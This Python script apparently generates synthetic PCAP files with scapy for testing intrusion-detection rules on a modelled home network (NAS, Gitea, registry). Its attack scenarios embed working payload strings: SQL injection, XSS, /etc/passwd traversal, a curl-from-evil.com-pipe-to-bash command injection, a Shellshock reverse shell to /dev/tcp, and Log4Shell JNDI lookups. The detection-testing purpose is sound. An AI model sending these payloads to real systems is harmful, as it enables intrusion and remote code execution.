"""
Generate synthetic traffic PCAPs for the local network digital twin demo.

Devices modeled:
  192.168.1.1   Router/gateway
  192.168.1.60  Synology NAS  (SMB :445, DSM web :5000, QuickConnect HTTPS)
  192.168.1.62  Gitea server  (HTTP :80, SSH :22)
  192.168.1.86  Docker registry (HTTPS :5000)
  192.168.1.100 Generic LAN client
  10.0.0.1      External attacker

No root required — packets are crafted offline and written to PCAP files.
"""

import os
import time
from pathlib import Path
from scapy.all import IP, TCP, UDP, ICMP, Raw, wrpcap

# ── Device IPs ────────────────────────────────────────────────────────────────
ROUTER   = "192.168.1.1"
NAS      = "192.168.1.60"
GITEA    = "192.168.1.62"
REGISTRY = "192.168.1.86"
CLIENT   = "192.168.1.100"
ATTACKER = "10.0.0.1"

# Synology QuickConnect relay IPs (real Synology CDN range for reference)
SYNOLOGY_RELAY = "52.69.100.1"

OUT_DIR = Path(__file__).parent / "traffic"


# ── Packet helpers ────────────────────────────────────────────────────────────

def _tcp(src, dst, sport, dport, payload=b"", flags="S", seq=1000, ack=0):
    pkt = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags=flags, seq=seq, ack=ack)
    if payload:
        pkt = pkt / Raw(load=payload)
    return pkt


def _udp(src, dst, sport, dport, payload=b""):
    return IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / Raw(load=payload)


def _icmp(src, dst, seq=0):
    return IP(src=src, dst=dst) / ICMP(id=1234, seq=seq)


def _flow(src, dst, sport, dport, fwd_payloads, bwd_payload=b"", base_ts=None):
    """Build a complete request/response TCP flow."""
    ts = base_ts or time.time()
    pkts = []
    pkts.append(_tcp(src, dst, sport, dport, flags="S"))
    pkts[-1].time = ts
    pkts.append(_tcp(dst, src, dport, sport, flags="SA", seq=5000, ack=1001))
    pkts[-1].time = ts + 0.005
    offset = 0.01
    for i, payload in enumerate(fwd_payloads):
        pkts.append(_tcp(src, dst, sport, dport, payload, flags="PA", seq=1001 + i * 500))
        pkts[-1].time = ts + offset
        offset += 0.01
    if bwd_payload:
        pkts.append(_tcp(dst, src, dport, sport, bwd_payload, flags="PA", seq=5001))
        pkts[-1].time = ts + offset
    pkts.append(_tcp(src, dst, sport, dport, flags="FA", seq=2001))
    pkts[-1].time = ts + offset + 0.005
    return pkts


# ── Scenarios ─────────────────────────────────────────────────────────────────

def make_normal_traffic():
    """Baseline traffic — no attacks. Should produce zero alerts."""
    pkts = []
    ts = time.time()

    # NAS → Synology relay: QuickConnect HTTPS heartbeat every 30 s
    for i in range(6):
        base = ts + i * 30
        pkts += _flow(NAS, SYNOLOGY_RELAY, 54320 + i, 443,
                      [b"TLS_CLIENT_HELLO_SNI_synology.com"],
                      b"TLS_SERVER_HELLO", base_ts=base)

    # CLIENT → NAS :445 (SMB backup chunks, bidirectional)
    for i in range(8):
        base = ts + i * 7
        pkts += _flow(CLIENT, NAS, 50000 + i, 445,
                      [b"SMB2_NEGOTIATE", b"SMB2_SESSION_SETUP", b"SMB2_TREE_CONNECT"],
                      b"SMB2_NEGOTIATE_RESPONSE", base_ts=base)

    # CLIENT → GITEA :80 (normal git clone / web browse)
    for i in range(6):
        req = b"GET /roberto/cnds.git/info/refs HTTP/1.1\r\nHost: 192.168.1.62\r\n\r\n"
        resp = b"HTTP/1.1 200 OK\r\nContent-Length: 80\r\n\r\n" + b"ref: refs/heads/master\n"
        pkts += _flow(CLIENT, GITEA, 60000 + i, 80, [req], resp, base_ts=ts + i * 15)

    # Normal ICMP health checks
    for i in range(5):
        pkt = _icmp(CLIENT, NAS, seq=i)
        pkt.time = ts + i * 20
        pkts.append(pkt)

    pkts.sort(key=lambda p: float(p.time))
    return pkts


def make_icmp_flood():
    """ICMP flood: ATTACKER → NAS. Triggers: icmp_flood (>50 packets)."""
    pkts = []
    ts = time.time()
    for i in range(65):
        pkt = _icmp(ATTACKER, NAS, seq=i)
        pkt.time = ts + i * 0.01
        pkts.append(pkt)
    return pkts


def make_nas_sqli():
    """SQL injection against NAS DSM login (:5000). Triggers: payload:sql_injection."""
    payload = (
        b"POST /webapi/auth.cgi HTTP/1.1\r\n"
        b"Host: 192.168.1.60:5000\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 78\r\n\r\n"
        b"account=' UNION SELECT username,password FROM users--&passwd=x&method=login"
    )
    resp = b"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n"
    return _flow(ATTACKER, NAS, 55000, 5000, [payload], resp)


def make_nas_credential_stuffing():
    """Rapid credential stuffing on NAS DSM. Triggers: payload:sql_injection (multiple flows)."""
    pkts = []
    ts = time.time()
    users = [b"admin", b"roberto", b"root", b"administrator", b"guest", b"user"]
    for i, user in enumerate(users):
        payload = (
            b"POST /webapi/auth.cgi HTTP/1.1\r\n"
            b"Host: 192.168.1.60:5000\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            b"account=" + user + b"' OR '1'='1&passwd=password&method=login"
        )
        resp = b"HTTP/1.1 401 Unauthorized\r\n\r\n"
        pkts += _flow(ATTACKER, NAS, 55100 + i, 5000, [payload], resp, base_ts=ts + i * 0.5)
    return pkts


def make_gitea_web_attack():
    """XSS + path traversal on Gitea. Triggers: payload:xss, payload:path_traversal."""
    pkts = []
    ts = time.time()

    # XSS
    xss = (
        b"GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\r\n"
        b"Host: 192.168.1.62\r\n\r\n"
    )
    pkts += _flow(ATTACKER, GITEA, 55200, 80, [xss],
                  b"HTTP/1.1 400 Bad Request\r\n\r\n", base_ts=ts)

    # Path traversal / LFI
    lfi = (
        b"GET /../../../../../../etc/passwd HTTP/1.1\r\n"
        b"Host: 192.168.1.62\r\n\r\n"
    )
    pkts += _flow(ATTACKER, GITEA, 55201, 80, [lfi],
                  b"HTTP/1.1 403 Forbidden\r\n\r\n", base_ts=ts + 1.0)

    return pkts


def make_command_injection():
    """Command injection via Gitea webhook API. Triggers: payload:command_injection."""
    payload = (
        b"POST /api/v1/repos/roberto/cnds/hooks HTTP/1.1\r\n"
        b"Host: 192.168.1.62\r\nContent-Type: application/json\r\n\r\n"
        b'{"url":"http://evil.com/$(curl http://evil.com/shell.sh | bash)",'
        b'"events":["push"],"active":true}'
    )
    return _flow(ATTACKER, GITEA, 55300, 80, [payload],
                 b"HTTP/1.1 201 Created\r\n\r\n")


def make_shellshock():
    """Shellshock via HTTP header. Triggers: payload:shellshock."""
    payload = (
        b"GET /cgi-bin/status HTTP/1.1\r\n"
        b"Host: 192.168.1.60:5000\r\n"
        b"User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\r\n\r\n"
    )
    return _flow(ATTACKER, NAS, 55400, 5000, [payload],
                 b"HTTP/1.1 500 Internal Server Error\r\n\r\n")


def make_exfiltration():
    """Data exfiltration from NAS. Triggers: large_payload, asymmetric_upload."""
    ts = time.time()
    pkts = []

    # SYN
    syn = _tcp(NAS, ATTACKER, 56000, 443, flags="S")
    syn.time = ts
    pkts.append(syn)

    # One large payload packet (>LARGE_PAYLOAD_BYTES = 10000)
    big_chunk = b"EXFIL:" + b"A" * 10500
    upload = _tcp(NAS, ATTACKER, 56000, 443, big_chunk, flags="PA", seq=1001)
    upload.time = ts + 0.01
    pkts.append(upload)

    # Many more forward packets to exceed asymmetric_upload ratio (>10 fwd, ratio >50)
    for i in range(13):
        chunk = b"DATA:" + bytes(range(256)) * 4
        pkt = _tcp(NAS, ATTACKER, 56000, 443, chunk, flags="PA", seq=2001 + i * 1100)
        pkt.time = ts + 0.1 + i * 0.05
        pkts.append(pkt)

    # Single tiny ack from attacker (keeps bwd_lengths small for ratio >50)
    ack = _tcp(ATTACKER, NAS, 443, 56000, b"OK", flags="PA")
    ack.time = ts + 1.5
    pkts.append(ack)

    return pkts


def make_log4shell():
    """Log4Shell (CVE-2021-44228) probe. Triggers: payload:log4j."""
    payload = (
        b"GET / HTTP/1.1\r\n"
        b"Host: 192.168.1.62\r\n"
        b"X-Api-Version: ${jndi:ldap://10.0.0.1:1389/a}\r\n"
        b"User-Agent: ${jndi:dns://10.0.0.1/log4shell}\r\n\r\n"
    )
    return _flow(ATTACKER, GITEA, 55500, 80, [payload],
                 b"HTTP/1.1 200 OK\r\n\r\n")


# ── Scenario registry ─────────────────────────────────────────────────────────

SCENARIOS = [
    ("normal_traffic",          make_normal_traffic,          "Baseline — normal NAS/Gitea/router activity (expect 0 alerts)"),
    ("icmp_flood",              make_icmp_flood,              "ICMP flood: ATTACKER → NAS :60 (rule: icmp_flood)"),
    ("nas_sqli",                make_nas_sqli,                "SQL injection on NAS DSM login :5000 (rule: sql_injection)"),
    ("nas_credential_stuffing", make_nas_credential_stuffing, "Credential stuffing on NAS DSM (rule: sql_injection × N)"),
    ("gitea_web_attack",        make_gitea_web_attack,        "XSS + path traversal on Gitea :80 (rules: xss, path_traversal)"),
    ("command_injection",       make_command_injection,       "Command injection via Gitea webhook API (rule: command_injection)"),
    ("shellshock",              make_shellshock,              "Shellshock via HTTP User-Agent on NAS :5000 (rule: shellshock)"),
    ("exfiltration",            make_exfiltration,            "Large data exfiltration NAS → external (rules: large_payload, asymmetric_upload)"),
    ("log4shell",               make_log4shell,               "Log4Shell probe on Gitea (rule: log4j)"),
]


def generate_all(out_dir: Path = OUT_DIR) -> dict:
    out_dir.mkdir(parents=True, exist_ok=True)
    paths = {}
    for name, fn, desc in SCENARIOS:
        pkts = fn()
        path = out_dir / f"{name}.pcap"
        wrpcap(str(path), pkts)
        paths[name] = path
        print(f"  [{name}]  {len(pkts):3d} pkts  →  {path.name}")
    return paths


if __name__ == "__main__":
    print("Generating traffic PCAPs...")
    generate_all()
    print("Done.")
